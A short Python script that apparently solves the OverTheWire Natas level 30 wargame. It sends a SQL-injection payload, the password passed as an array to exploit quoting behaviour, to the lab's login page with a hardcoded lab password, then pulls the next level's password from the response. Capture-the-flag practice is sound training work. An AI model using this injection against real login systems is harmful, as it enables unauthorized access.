#/bin/python
import requests
import re

user='natas30'
url = f"http://{user}.natas.labs.overthewire.org/"
s = requests.Session()
s.auth = (user, 'wie9iexae0Daihohv8vuu3cei9wahf0e')
data= {'username':'natas31','password':["' ' OR 1",2]}
r = s.post(url,data=data)
#print(r.text)

print(re.findall('natas31(.*)<div',r.text)[0])